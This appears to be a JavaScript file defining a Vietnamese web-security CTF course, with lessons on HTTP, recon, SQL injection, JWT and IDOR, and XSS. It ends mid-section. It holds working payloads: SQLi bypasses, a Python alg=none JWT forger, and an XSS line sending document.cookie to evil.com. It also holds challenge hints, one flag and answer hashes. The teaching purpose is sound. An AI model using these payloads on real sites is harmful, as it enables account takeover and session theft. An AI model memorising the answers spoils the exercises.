/* Track: web — 6 bài từ HTTP căn bản đến lỗ hổng phía server.
   Thử thách chạy trên lab FastAPI thật (labs/web_*.py) qua curl, và widget phía client. */

/* ============================ Bài 1: HTTP ============================ */
lesson({
  id: "web-http",
  track: "web",
  order: 1,
  level: 1,
  title: "Web & HTTP căn bản",
  short: "Request, response, method, status, header, cookie",
  time: "35 phút",
  html: `
<h2 id="mo-hinh">Mô hình client – server</h2>
<p>Mọi tương tác web là một vòng <strong>request → response</strong>. Trình duyệt (client) gửi một yêu cầu tới máy chủ (server), server xử lý rồi trả về phản hồi. Nguyên tắc vàng của bảo mật web: <strong>server không bao giờ được tin dữ liệu từ client</strong> — vì toàn bộ request đều do client tạo ra và có thể bị sửa tuỳ ý.</p>
<div class="diagram">
<svg viewBox="0 0 640 150" xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13">
  <rect x="20" y="50" width="130" height="50" rx="8" fill="#141b25" stroke="#2a3546"/>
  <text x="85" y="80" fill="#e6edf3" text-anchor="middle">Client</text>
  <rect x="490" y="50" width="130" height="50" rx="8" fill="#141b25" stroke="#2a3546"/>
  <text x="555" y="80" fill="#e6edf3" text-anchor="middle">Server</text>
  <line x1="150" y1="65" x2="490" y2="65" stroke="#5cc8ff" stroke-width="1.5" marker-end="url(#a)"/>
  <text x="320" y="58" fill="#5cc8ff" text-anchor="middle">GET /profile  (request)</text>
  <line x1="490" y1="90" x2="150" y2="90" stroke="#3dffa2" stroke-width="1.5" marker-end="url(#a)"/>
  <text x="320" y="110" fill="#3dffa2" text-anchor="middle">200 OK + HTML  (response)</text>
  <defs><marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6" fill="#8b98a9"/></marker></defs>
</svg>
</div>

<h2 id="cau-truc">Cấu trúc một request/response</h2>
<p>Một HTTP message gồm ba phần: <strong>dòng đầu</strong> (method + đường dẫn, hoặc status code), các <strong>header</strong>, một dòng trống, rồi <strong>body</strong> (có thể rỗng).</p>
${http`
POST /login HTTP/1.1            ← method + path + phiên bản
Host: example.com              ← các header...
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123
                               ← dòng trống ngăn header với body
username=admin&password=1234   ← body

HTTP/1.1 200 OK                ← status line
Set-Cookie: session=xyz789     ← server đặt cookie cho client
Content-Type: text/html

<html>...</html>               ← body
`}

<h2 id="method">HTTP method</h2>
<table>
<tr><th>Method</th><th>Dùng để</th><th>Ghi chú CTF</th></tr>
<tr><td><code>GET</code></td><td>Lấy dữ liệu; tham số nằm trên URL</td><td>Luôn thử đầu tiên</td></tr>
<tr><td><code>POST</code></td><td>Gửi dữ liệu; tham số nằm trong body</td><td>Form đăng nhập, upload</td></tr>
<tr><td><code>PUT</code> / <code>DELETE</code></td><td>Tạo/sửa / xoá tài nguyên</td><td>API REST; đôi khi để hở</td></tr>
<tr><td><code>OPTIONS</code></td><td>Hỏi server hỗ trợ method nào</td><td>Lộ method ẩn qua header <code>Allow</code></td></tr>
</table>
<div class="callout tip"><b>Mẹo</b><p>Một endpoint tưởng chỉ đọc (GET) đôi khi làm việc khác hẳn khi gọi bằng POST/PUT. Luôn thử đổi method.</p></div>

<h2 id="status">Status code</h2>
<div class="grid-2">
<div class="card"><h4>2xx — Thành công</h4><p><code>200 OK</code>, <code>201 Created</code>, <code>204 No Content</code></p></div>
<div class="card"><h4>3xx — Chuyển hướng</h4><p><code>301/302</code> → đổi địa chỉ (theo bằng <code>-L</code>), <code>304</code> cache</p></div>
<div class="card"><h4>4xx — Lỗi do client</h4><p><code>401</code> chưa xác thực, <code>403</code> cấm, <code>404</code> không thấy, <code>405</code> sai method</p></div>
<div class="card"><h4>5xx — Lỗi do server</h4><p><code>500</code> lỗi nội bộ (SQLi thường gây ra), <code>502/503</code></p></div>
</div>

<h2 id="header-cookie">Header và cookie</h2>
<p><strong>Header</strong> mang thông tin phụ: <code>User-Agent</code> (loại trình duyệt), <code>Referer</code> (trang trước), <code>Authorization</code> (thông tin đăng nhập), <code>Content-Type</code>... Nhiều bài giấu flag trong header response, hoặc chỉ mở khoá khi bạn gửi đúng một header.</p>
<p><strong>Cookie</strong> là cặp khoá–giá trị server lưu trên trình duyệt qua <code>Set-Cookie</code>, và trình duyệt tự gửi lại ở mỗi request qua header <code>Cookie</code>. Vì cookie nằm ở phía client, bạn sửa được — đó là cơ sở của rất nhiều bài web.</p>

<h2 id="url">URL và URL-encoding</h2>
${txt`
https://example.com:443/search?q=ctf&page=2#top
└─scheme─┘ └──host───┘└p┘└─path─┘└────query────┘└fragment┘
`}
<p>Ký tự đặc biệt trên URL phải được mã hoá: dấu cách → <code>%20</code>, <code>&amp;</code> → <code>%26</code>, <code>=</code> → <code>%3D</code>. Khi dùng curl, hãy bọc URL trong dấu nháy và encode các ký tự này để không bị shell hiểu nhầm.</p>

<h2 id="curl">curl — con dao của dân web</h2>
<p><code>curl</code> gửi request thô từ dòng lệnh, kiểm soát từng chi tiết:</p>
${sh`
$ curl -i http://target/            # -i: in cả header response
$ curl -X POST http://target/api    # đổi method
$ curl -b "role=admin" http://t/x   # gửi cookie
$ curl -H "X-Key: 42" http://t/x    # thêm header
$ curl -d "a=1&b=2" http://t/form   # gửi body (tự động thành POST)
$ curl -L http://target/go          # theo redirect 3xx
`}

<h2 id="thuc-hanh">Thực hành: tấn công lab HTTP</h2>
<p>Terminal dưới đây có <code>curl</code> thật, bắn tới lab <code>web_http</code> đang chạy trên server. Gõ <code>cat targets.txt</code>, hoặc mở thẳng <a href="/lab/web_http/" target="_blank" rel="noopener">trang lab</a> trong tab mới.</p>
<div data-widget="shell" data-fs="web" data-height="320"></div>
<div data-chal="web-http-1"></div>
<div data-chal="web-http-2"></div>
<div data-chal="web-http-3"></div>
<div data-chal="web-http-4"></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Server trả về <code>405 Method Not Allowed</code> kèm header <code>Allow: POST</code>. Bạn nên làm gì?",
      options: ["Bỏ qua, endpoint hỏng", "Gửi lại bằng <code>curl -X POST</code>", "Thêm cookie admin", "Đổi sang HTTPS"],
      answer: 1,
      explain: "405 nghĩa là method sai; header <code>Allow</code> cho biết method đúng. Ở đây là POST.",
    },
    {
      q: "Vì sao sửa cookie <code>role=user</code> thành <code>role=admin</code> đôi khi chiếm được quyền admin?",
      options: ["Vì cookie được mã hoá", "Vì cookie do client giữ, server lại tin nó mà không kiểm tra", "Vì trình duyệt tự nâng quyền", "Vì HTTPS cho phép"],
      answer: 1,
      explain: "Cookie nằm trên máy client nên sửa được. Lỗi nằm ở server khi tin dữ liệu client mà không xác thực lại.",
    },
  ],
  challenges: {
    "web-http-1": { title: "Header giấu mặt", pts: 60, diff: "easy", hash: "430fe428d94752bd6b3e9d82ac252b4c81a1f689e7bb9e40f49a1d92e412914c",
      body: '<p>Endpoint <code>/lab/web_http/headers</code> nói trong body rằng chẳng có gì. Nhưng response còn có header. Lấy flag ra.</p>',
      hints: ["Flag nằm trong một header của response, không phải body.", "<code>curl -i http://lab.zctf.local/lab/web_http/headers</code> rồi tìm header <code>X-Flag</code>."] },
    "web-http-2": { title: "Đúng method", pts: 70, diff: "easy", hash: "c7f2be9e2ded84ad2a5b71ea4b57f0f38b24b9cc5f1a1993d427570a26917a25",
      body: '<p><code>/lab/web_http/method</code> trả 405 khi bạn GET. Nó muốn method nào?</p>',
      hints: ["Xem header <code>Allow</code> trong phản hồi 405.", "<code>curl -X POST http://lab.zctf.local/lab/web_http/method</code>"] },
    "web-http-3": { title: "Vé VIP", pts: 80, diff: "med", hash: "0aa2e1e697ad627f8b3182fd7ab8058d5f7948a86e2dd47bed78be965c44f820",
      body: '<p><code>/lab/web_http/vip</code> chỉ mở cho thành viên có cookie <code>role=vip</code>.</p>',
      hints: ["Dùng <code>-b</code> để gửi cookie.", "<code>curl -b \"role=vip\" http://lab.zctf.local/lab/web_http/vip</code>"] },
    "web-http-4": { title: "Theo chân", pts: 80, diff: "med", hash: "33c84e4e64742864a3f5499cf5d31ac82198d089500d9fa8d168700868905141",
      body: '<p><code>/lab/web_http/start</code> trả về mã 301. Bản thân nó không có flag — nhưng nó chỉ đường tới nơi có.</p>',
      hints: ["301 là redirect. curl mặc định KHÔNG tự đi theo.", "<code>curl -L http://lab.zctf.local/lab/web_http/start</code>"] },
  },
});

/* ========================= Bài 2: Trinh sát ========================= */
lesson({
  id: "web-recon",
  track: "web",
  order: 2,
  level: 1,
  title: "Trinh sát & phía client",
  short: "View-source, DevTools, robots.txt, file lộ, bypass JS",
  time: "35 phút",
  html: `
<h2 id="vi-sao">Trinh sát trước, tấn công sau</h2>
<p>Trước khi khai thác, hãy thu thập tối đa thông tin về mục tiêu. Rất nhiều bài web "dễ" được giải trọn vẹn chỉ bằng bước trinh sát: flag nằm trong comment HTML, trong file JavaScript, trong một đường dẫn ẩn, hay một file sao lưu bị để hớ.</p>

<h2 id="client">Mọi thứ phía client đều trong tay bạn</h2>
<ul>
<li><strong>Xem mã nguồn</strong> <kbd>Ctrl</kbd>+<kbd>U</kbd>: tìm comment <code>&lt;!-- --&gt;</code>, biến ẩn, đường dẫn, khoá API bị lộ.</li>
<li><strong>DevTools</strong> <kbd>F12</kbd>: tab <em>Elements</em> (DOM sau khi JS chạy), <em>Console</em> (chạy JS tuỳ ý), <em>Network</em> (mọi request), <em>Application</em> (cookie, localStorage, sessionStorage).</li>
<li><strong>File JavaScript</strong>: tải về đọc. Logic kiểm tra, endpoint API, đôi khi cả mật khẩu nằm ở đây.</li>
</ul>
<div class="callout warn"><b>Kiểm tra phía client không bảo vệ được gì</b>
<p>Nút bị <code>disabled</code>, trường <code>maxlength</code>, hàm <code>checkPassword()</code> chạy trong trình duyệt — tất cả đều có thể xoá/sửa/gọi tay. Mọi quyết định bảo mật phải nằm ở server.</p></div>

<h2 id="duong-dan">Đường dẫn và file hay bị lộ</h2>
<table>
<tr><th>Đường dẫn</th><th>Có gì</th></tr>
<tr><td><code>/robots.txt</code></td><td>Liệt kê thư mục mà chủ trang <em>không muốn</em> bot vào — tức là chỉ điểm chỗ nhạy cảm</td></tr>
<tr><td><code>/sitemap.xml</code></td><td>Danh sách trang, có khi cả trang ẩn</td></tr>
<tr><td><code>/.git/</code></td><td>Toàn bộ lịch sử mã nguồn nếu bị deploy nhầm (dùng <code>git-dumper</code>)</td></tr>
<tr><td><code>/.env</code>, <code>config.php.bak</code>, <code>backup.zip</code></td><td>Mật khẩu DB, khoá bí mật do sao lưu/cấu hình sai</td></tr>
<tr><td><code>/admin</code>, <code>/debug</code>, <code>/api</code></td><td>Khu quản trị, trang gỡ lỗi bật nhầm</td></tr>
</table>
<p>Công cụ dò đường dẫn: <code>gobuster</code>, <code>ffuf</code>, <code>dirsearch</code> với một danh sách từ (wordlist).</p>

<h2 id="thuc-hanh-1">Thực hành: nhìn kỹ</h2>
<div data-chal="wb1"></div>

<h2 id="thuc-hanh-2">Thực hành: trinh sát lab</h2>
<p>Lab <code>web_recon</code> là một blog. Bắt đầu từ <code>/robots.txt</code>. Terminal có curl; hoặc mở <a href="/lab/web_recon/robots.txt" target="_blank" rel="noopener">robots.txt</a> trực tiếp.</p>
<div data-widget="shell" data-fs="web" data-height="300"></div>
<div data-chal="web-recon-2"></div>
<div data-chal="web-recon-3"></div>

<h2 id="bypass">Bypass kiểm tra phía client</h2>
<p>Két sắt dưới đây kiểm tra mật khẩu bằng JavaScript chạy ngay trong trình duyệt bạn. Mã nguồn hàm kiểm tra nằm ngay trong trang — mở ra đọc là biết mật khẩu.</p>
<div data-chal="web-recon-4"></div>
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Một file <code>/robots.txt</code> ghi <code>Disallow: /secret-admin</code>. Điều này nghĩa là gì với người tấn công?",
      options: ["Không vào được /secret-admin", "Có một đường dẫn /secret-admin đáng để thử vào", "Trang đã được bảo mật", "Bot Google sẽ chặn bạn"],
      answer: 1,
      explain: "robots.txt chỉ là lời đề nghị với bot, không chặn ai. Nó vô tình tiết lộ các đường dẫn nhạy cảm.",
    },
  ],
  challenges: {
    wb1: { title: "Nhìn kỹ hơn", pts: 50, diff: "easy", hash: "bc6f918386eb790e2e4a2adfc51d765eef59169564faebab8a838e389ee45110",
      body: '<p>Flag nằm ngay trong khung này, nhưng bạn không nhìn thấy nó trên màn hình.</p><!-- Lập trình viên quên xoá: zCTF{v13w_s0urc3_l4_b4n} -->',
      hints: ["Chuột phải vào khung này → <em>Inspect</em> (Kiểm tra).", "Tìm một comment HTML <code>&lt;!-- ... --&gt;</code> trong tab Elements."] },
    "web-recon-2": { title: "Robot chỉ đường", pts: 70, diff: "easy", hash: "95673c360a5ae5e28e5a876d640efdeee0c9b2a9f6e17dfadcc1cfaf74e7fc58",
      body: '<p>Đọc <code>/lab/web_recon/robots.txt</code>. Nó cấm bot vào vài đường dẫn — hãy vào thử đường dẫn trang quản trị.</p>',
      hints: ["<code>curl http://lab.zctf.local/lab/web_recon/robots.txt</code>", "Lấy đường dẫn trong dòng <code>Disallow</code> (cái trông như trang quản trị) rồi curl vào đó."] },
    "web-recon-3": { title: "File sao lưu hớ hênh", pts: 90, diff: "med", hash: "397fba6ab72abf256c1bb13b702947b37bace0d40f9e40043633f94362981f03",
      body: '<p>robots.txt còn nhắc tới file cấu hình và thư mục backup. Một file <code>.env</code> (hoặc bản <code>.bak</code>) đang để public.</p>',
      hints: ["Thử <code>/lab/web_recon/.env</code> hoặc <code>/lab/web_recon/backup/config.php.bak</code>.", "<code>curl http://lab.zctf.local/lab/web_recon/.env</code> rồi tìm <code>SECRET_FLAG</code>."] },
    "web-recon-4": { title: "Két sắt bằng giấy", pts: 90, diff: "med", hash: "2626268fe601f53d0e9d1640f5b5ece4252b1ca900ecc3c52155e25fcb9cce75", widget: "clientauth",
      body: '<p>Mở <em>Xem mã nguồn trang</em> bên dưới. Hàm <code>check()</code> so mật khẩu bạn nhập với một chuỗi cố định. Hãy đảo ngược phép biến đổi để tìm mật khẩu đúng.</p>',
      hints: ["Hàm làm: <code>btoa(đảo_ngược(pw))</code> rồi so với chuỗi. Làm ngược lại.", "Giải base64 chuỗi <code>eWFnbl9hb2hrXzBt</code>, rồi đảo ngược kết quả. Dùng tab Công cụ → Giải mã (From Base64, Reverse)."] },
  },
});

/* ========================= Bài 3: SQL Injection ========================= */
lesson({
  id: "web-sqli",
  track: "web",
  order: 3,
  level: 2,
  title: "SQL Injection",
  short: "Bypass login, UNION trích bảng khác, blind, phòng chống",
  time: "45 phút",
  html: `
<h2 id="goc-re">Gốc rễ của lỗi</h2>
<p>SQL Injection xảy ra khi server <strong>ghép thẳng dữ liệu người dùng vào câu truy vấn SQL</strong> dưới dạng chuỗi. Dữ liệu của bạn khi đó không còn là "dữ liệu" nữa mà trở thành một phần của <em>câu lệnh</em>.</p>
${py`
# Code có lỗ hổng: nối chuỗi trực tiếp
query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pw + "'"
`}
<p>Nếu <code>user = admin' --</code> thì câu lệnh biến thành:</p>
${sql`
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
`}
<p>Dấu <code>'</code> đóng chuỗi sớm; <code>--</code> biến phần còn lại thành chú thích. Điều kiện mật khẩu <em>biến mất</em>. Bạn đăng nhập thành admin mà không cần mật khẩu.</p>

<h2 id="luyen-sql">Luyện SQL trước đã</h2>
<p>Muốn khai thác SQL, phải đọc hiểu SQL. Dưới đây là SQLite thật với dữ liệu mẫu. Thử <code>SELECT</code>, <code>WHERE</code>, <code>UNION</code>, <code>JOIN</code>:</p>
<div data-widget="sql" data-db="shop"></div>

<h2 id="bypass-login">1. Bypass đăng nhập</h2>
<p>Các payload kinh điển cho ô username:</p>
<table>
<tr><th>Payload</th><th>Ý tưởng</th></tr>
<tr><td><code>admin' --</code></td><td>Đăng nhập thành admin, bỏ qua mật khẩu</td></tr>
<tr><td><code>' OR 1=1 --</code></td><td>Điều kiện luôn đúng → trả về người dùng đầu tiên</td></tr>
<tr><td><code>' OR '1'='1</code></td><td>Biến thể không dùng chú thích</td></tr>
</table>
<p>Form mô phỏng (hiển thị câu SQL theo thời gian thực để bạn hiểu chuyện gì xảy ra):</p>
<div data-chal="wb3"></div>

<h2 id="union">2. UNION — trích dữ liệu bảng khác</h2>
<p>Khi một trang hiển thị kết quả truy vấn (ví dụ ô tìm kiếm), <code>UNION SELECT</code> cho phép bạn <strong>gắn thêm</strong> kết quả từ một câu SELECT khác — kể cả từ bảng không liên quan.</p>
<ol class="steps-v" style="--c:#ff6bb5">
<li><strong>Đếm số cột</strong> của truy vấn gốc: thử <code>' ORDER BY 1--</code>, <code>2--</code>, <code>3--</code>... đến khi lỗi; hoặc <code>' UNION SELECT 1,2,3--</code> cho tới khi khớp.</li>
<li><strong>Tìm bảng</strong>: <code>' UNION SELECT name,2,3 FROM sqlite_master--</code> (SQLite) để liệt kê tên bảng.</li>
<li><strong>Trích dữ liệu</strong>: đặt cột cần lấy vào đúng vị trí số cột, ví dụ <code>' UNION SELECT flag,2,3 FROM secret--</code>.</li>
</ol>
<p>Lab <code>web_sqli</code> có ô tìm kiếm <code>/search?q=</code> trả về bảng <code>products(id, name, price)</code> — 3 cột. Đâu đó có bảng <code>secret</code>. Terminal bên dưới có curl; hãy nhớ URL-encode (dấu cách = <code>%20</code>, <code>'</code> = <code>%27</code>), hoặc bọc URL trong nháy đơn.</p>
<div data-widget="shell" data-fs="web" data-height="320"></div>
<div data-chal="web-sqli-2"></div>

<h2 id="backend-that">3. Bypass login trên backend thật</h2>
<p>Widget phía trên là mô phỏng. Lab <code>web_sqli</code> có endpoint <code>/login</code> dùng SQLite <em>thật</em>, ghép chuỗi y hệt code lỗi ở đầu bài. Gửi POST và tiêm vào trường <code>username</code>.</p>
<div data-chal="web-sqli-3"></div>

<h2 id="blind">Blind SQLi</h2>
<p>Khi trang không in kết quả ra (chỉ "đúng/sai", hoặc nhanh/chậm), ta vẫn trích được dữ liệu từng bit một bằng câu điều kiện:</p>
${sql`
-- Boolean-based: trang phản hồi khác nhau tuỳ điều kiện đúng/sai
' AND substr((SELECT password FROM users WHERE username='admin'),1,1)='S' --
-- Time-based: nếu đúng thì server "ngủ" vài giây
' AND 1=1 AND (SELECT sleep(3)) --
`}
<p>Làm tay rất lâu, nên người ta dùng <code>sqlmap</code> để tự động hoá.</p>

<h2 id="phong-chong">Phòng chống</h2>
<div class="callout tip"><b>Prepared statement (truy vấn tham số hoá)</b>
<p>Không bao giờ nối chuỗi. Tách <em>câu lệnh</em> và <em>dữ liệu</em>, để thư viện DB tự xử lý việc "thoát" ký tự:</p></div>
${py`
# An toàn: dấu ? là chỗ dành cho dữ liệu, không bao giờ bị hiểu thành lệnh
cur.execute("SELECT * FROM users WHERE username = ? AND password = ?", (user, pw))
`}
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Dùng <code>UNION SELECT</code>, điều kiện bắt buộc để không bị lỗi là gì?",
      options: ["Phải có cột password", "Số cột của SELECT thêm phải bằng số cột truy vấn gốc", "Phải là HTTPS", "Bảng phải tên 'users'"],
      answer: 1,
      explain: "UNION gộp hai tập kết quả nên số cột (và kiểu tương thích) phải khớp. Vì vậy bước đầu luôn là đếm số cột.",
    },
    {
      q: "Cách phòng chống SQL injection đúng đắn nhất là gì?",
      options: ["Lọc bỏ dấu nháy đơn", "Dùng prepared statement (truy vấn tham số hoá)", "Ẩn thông báo lỗi", "Đổi tên bảng"],
      answer: 1,
      explain: "Lọc ký tự dễ bị vượt qua. Prepared statement tách lệnh khỏi dữ liệu nên dữ liệu không bao giờ trở thành lệnh.",
    },
  ],
  challenges: {
    wb3: { title: "Đăng nhập không cần mật khẩu", pts: 120, diff: "med", hash: "ed2d57eac11feb8b2ab6668006c0da54f39537c130ee1e643ad2bd83f6c211dd", widget: "sqli",
      body: "<p>Đăng nhập với tài khoản <code>admin</code>. Bạn không biết mật khẩu. Ô bên dưới hiển thị câu SQL mà server sẽ chạy.</p>",
      hints: ["Thử nhập một dấu <code>'</code> vào username và xem chuyện gì xảy ra.", "Username: <code>admin' --</code>, mật khẩu: bất kỳ."] },
    "web-sqli-2": { title: "UNION trích kho báu", pts: 170, diff: "hard", hash: "751cca51d3bd4c57bc27d4d2ffb100715242906beabd736a3d4f99f65612ae1d",
      body: '<p>Ô tìm kiếm <code>/lab/web_sqli/search?q=</code> trả về 3 cột. Dùng UNION để lấy cột <code>flag</code> từ bảng <code>secret</code>.</p>',
      hints: ["Truy vấn gốc có 3 cột (id, name, price). UNION cũng phải 3 cột.", "<code>curl \"http://lab.zctf.local/lab/web_sqli/search?q=x' UNION SELECT flag,2,3 FROM secret-- -\"</code> (nhớ URL-encode dấu cách thành %20 nếu cần, hoặc để trong nháy đơn như trên)."] },
    "web-sqli-3": { title: "Backend thật", pts: 150, diff: "hard", hash: "4b53c4171204146ef7e77c89b7e4f902f8a3c55bd38f069fa676198e2194f292",
      body: '<p>POST tới <code>/lab/web_sqli/login</code> với <code>username</code> và <code>password</code>. Đăng nhập thành <code>admin</code> bằng injection để lấy flag.</p>',
      hints: ["Gửi body bằng <code>-d</code>: <code>-d \"username=...&password=x\"</code>.", "<code>curl -X POST http://lab.zctf.local/lab/web_sqli/login -d \"username=admin'-- -&password=x\"</code>"] },
  },
});

/* ========================= Bài 4: Xác thực ========================= */
lesson({
  id: "web-auth",
  track: "web",
  order: 4,
  level: 2,
  title: "Xác thực & phân quyền",
  short: "Cookie giả mạo, IDOR, JWT alg=none & secret yếu",
  time: "45 phút",
  html: `
<h2 id="hai-khai-niem">Xác thực ≠ phân quyền</h2>
<p><strong>Xác thực (authentication)</strong> trả lời "bạn là ai". <strong>Phân quyền (authorization)</strong> trả lời "bạn được làm gì". Phần lớn lỗi nghiêm trọng đến từ việc xác thực thì có, nhưng <em>quên kiểm tra quyền</em> trước mỗi hành động.</p>

<h2 id="cookie">Cookie tin cậy mù quáng</h2>
<p>Nếu server lưu vai trò ngay trong cookie (<code>role=user</code>, <code>isAdmin=0</code>) và tin nó, bạn chỉ việc sửa giá trị. Ứng dụng thật nên để cookie chỉ chứa một <em>session ID</em> ngẫu nhiên, còn vai trò tra ở server.</p>
<p>Trang quản trị dưới đây quyết định bạn là ai dựa trên cookie <code>zctf_role</code>. Mở DevTools → <em>Application → Cookies</em> và sửa nó.</p>
<div data-chal="wb2"></div>

<h2 id="idor">IDOR — đổi số là thấy</h2>
<p><strong>Insecure Direct Object Reference</strong>: ứng dụng cho bạn xem tài nguyên theo ID (<code>/account/1</code>, <code>/invoice?id=1001</code>) nhưng không kiểm tra tài nguyên đó có phải của bạn không. Đổi ID → xem dữ liệu người khác.</p>
<p>Lab <code>web_auth</code> có <code>/account/1</code> là của bạn. Thử các ID khác để tìm tài khoản admin.</p>
<div data-widget="shell" data-fs="web" data-height="300"></div>
<div data-chal="web-auth-2"></div>

<h2 id="jwt">JWT — token mang theo vai trò</h2>
<p><strong>JSON Web Token</strong> gồm ba phần ngăn bởi dấu chấm, mỗi phần mã hoá base64url: <code>header.payload.signature</code>.</p>
${txt`
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiYmFuIiwicm9sZSI6InVzZXIifQ . <chữ ký>
   header (thuật toán)          payload (dữ liệu, role...)        xác thực không bị sửa
`}
<p>Base64 không phải mã hoá — ai cũng đọc được payload. Chữ ký mới là thứ chống sửa. Hai lỗi kinh điển:</p>
<div class="grid-2">
<div class="card"><h4>alg: none</h4><p>Nếu server chấp nhận header <code>{"alg":"none"}</code>, token <em>không cần chữ ký</em>. Bạn sửa payload thành <code>role=admin</code>, bỏ trống phần chữ ký.</p></div>
<div class="card"><h4>Secret yếu</h4><p>Token HS256 ký bằng một secret. Nếu secret yếu (<code>secret</code>, <code>1234</code>), ta brute-force ra rồi tự ký token admin. Công cụ: <code>hashcat -m 16500</code>, <code>jwt_tool</code>.</p></div>
</div>
<p>Lab <code>web_auth</code> cho token user ở <code>/token</code> và kiểm tra ở <code>/me</code>. Server chấp nhận <code>alg=none</code>. Hãy tự chế một token <code>role=admin</code>. Dùng Python để tạo cho tiện:</p>
<div data-widget="python"><template>
import base64, json

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# Lỗ hổng alg=none: không cần chữ ký
header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"user": "ban", "role": "admin"}).encode())
token = f"{header}.{payload}."     # dấu chấm cuối: chữ ký rỗng
print(token)
print('curl -H "Authorization: Bearer ' + token + '" http://lab.zctf.local/lab/web_auth/me')
</template></div>
<div data-chal="web-auth-3"></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "Phần <code>payload</code> của JWT được mã hoá base64url. Điều đó có nghĩa là...",
      options: ["Nó được mã hoá, không đọc được", "Ai cũng giải base64 để đọc, nhưng không sửa được nếu không qua chữ ký", "Nó an toàn tuyệt đối", "Chỉ server đọc được"],
      answer: 1,
      explain: "Base64 là encoding, không phải mã hoá. Payload đọc thoải mái; thứ bảo vệ là chữ ký — và đó là chỗ thường bị cấu hình sai.",
    },
    {
      q: "Một API cho xem hoá đơn tại <code>/invoice?id=1001</code> mà không kiểm tra chủ sở hữu. Đây là lỗi gì?",
      options: ["XSS", "IDOR", "SQL injection", "CSRF"],
      answer: 1,
      explain: "Truy cập trực tiếp tài nguyên theo ID mà không kiểm tra quyền sở hữu chính là IDOR.",
    },
  ],
  challenges: {
    wb2: { title: "Cookie Monster", pts: 100, diff: "med", hash: "88ca18567d61bdacb3e2bdef8d016717c784becf1c7c722cc0bd21d56d020001", widget: "cookie",
      body: "<p>Trang quản trị dưới đây chỉ mở cho admin. Nó xác định bạn là ai bằng cách nào?</p>",
      hints: ["Mở DevTools → tab <em>Application</em> → <em>Cookies</em> (hoặc <em>Local Storage</em> nếu đang mở file trực tiếp).", "Đổi giá trị <code>zctf_role</code> từ <code>guest</code> thành <code>admin</code> rồi bấm lại nút."] },
    "web-auth-2": { title: "Đổi số là thấy", pts: 110, diff: "med", hash: "01254de807ae24abf7743648760d65ef717c92393764d8f1f951d7561a5c63ca",
      body: '<p><code>/lab/web_auth/account/1</code> là tài khoản của bạn. Tìm tài khoản admin và đọc ghi chú của nó.</p>',
      hints: ["Thử đổi số ID: 2, 3, ...", "<code>curl http://lab.zctf.local/lab/web_auth/account/2</code> — tài khoản admin, trường <code>note</code> chứa flag."] },
    "web-auth-3": { title: "Token tự chế", pts: 180, diff: "hard", hash: "348ca6548fa02350886d7d03e478ca4aa39222142c5cbb6c3d9da25367e7d10c",
      body: '<p>Tạo một JWT <code>role=admin</code> (lợi dụng <code>alg=none</code>) rồi gửi tới <code>/lab/web_auth/me</code> qua header <code>Authorization: Bearer &lt;token&gt;</code>.</p>',
      hints: ["Chạy đoạn Python mẫu phía trên để sinh token và câu lệnh curl.", "Token = base64url(header alg none) + \".\" + base64url(payload role admin) + \".\" (chữ ký rỗng). Gửi bằng <code>curl -H \"Authorization: Bearer ...\"</code> trong terminal."] },
  },
});

/* ========================= Bài 5: XSS ========================= */
lesson({
  id: "web-xss",
  track: "web",
  order: 5,
  level: 2,
  title: "Cross-Site Scripting (XSS)",
  short: "Reflected, stored, DOM; đánh cắp cookie; CSP",
  time: "40 phút",
  html: `
<h2 id="la-gi">XSS là gì</h2>
<p>XSS xảy ra khi một trang <strong>nhúng dữ liệu người dùng vào HTML mà không lọc</strong>, khiến JavaScript của kẻ tấn công chạy trên trình duyệt của <em>nạn nhân khác</em>. Khác với SQLi (tấn công server), XSS tấn công <strong>người dùng</strong>: đánh cắp cookie phiên, thao tác thay nạn nhân, deface trang.</p>

<h2 id="ba-loai">Ba loại XSS</h2>
<table>
<tr><th>Loại</th><th>Payload đi qua đâu</th><th>Ví dụ</th></tr>
<tr><td><strong>Reflected</strong></td><td>Phản chiếu ngay trong response của một request (thường qua tham số URL)</td><td><code>/search?q=&lt;script&gt;...</code> gửi link cho nạn nhân</td></tr>
<tr><td><strong>Stored</strong></td><td>Lưu trên server (bình luận, hồ sơ) rồi bật lên với mọi người xem</td><td>Nguy hiểm nhất: tự lan</td></tr>
<tr><td><strong>DOM-based</strong></td><td>JavaScript phía client tự đưa dữ liệu vào DOM (vd <code>innerHTML = location.hash</code>)</td><td>Không cần server xử lý</td></tr>
</table>

<h2 id="payload">Payload cơ bản</h2>
<div class="callout warn"><b>Lưu ý quan trọng</b>
<p>Thẻ <code>&lt;script&gt;</code> chèn qua <code>innerHTML</code> <strong>không tự chạy</strong>. Vì vậy ta dùng thuộc tính sự kiện trên thẻ khác:</p></div>
${txt`
<img src=x onerror=alert(1)>          ← ảnh lỗi → onerror chạy
<svg onload=alert(1)>                 ← svg tải xong → onload chạy
<body onpageshow=alert(1)>
<a href="javascript:alert(1)">bấm</a>
`}
<p>Để đánh cắp cookie, kẻ tấn công gửi cookie về máy mình bằng một ảnh beacon:</p>
${txt`
<img src=x onerror="new Image().src='//evil.com/?c='+document.cookie">
`}

<h2 id="thuc-hanh">Thực hành an toàn</h2>
<p>Dưới đây là một "blog" mô phỏng chạy trong khung cách ly (sandbox) — payload của bạn chỉ chạy trong khung đó, không ảnh hưởng gì tới trang này. Bình luận bạn gõ bị chèn thẳng vào trang nạn nhân.</p>

<h3 id="xss-1">Thử thách 1: làm alert() chạy</h3>
<div data-chal="web-xss-1"></div>

<h3 id="xss-2">Thử thách 2: đánh cắp cookie</h3>
<p>Cookie phiên của nạn nhân nằm ở <code>document.cookie</code>. Gửi nó về "kẻ tấn công" bằng một ảnh beacon.</p>
<div data-chal="web-xss-2"></div>

<h2 id="phong-chong">Phòng chống</h2>
<ul>
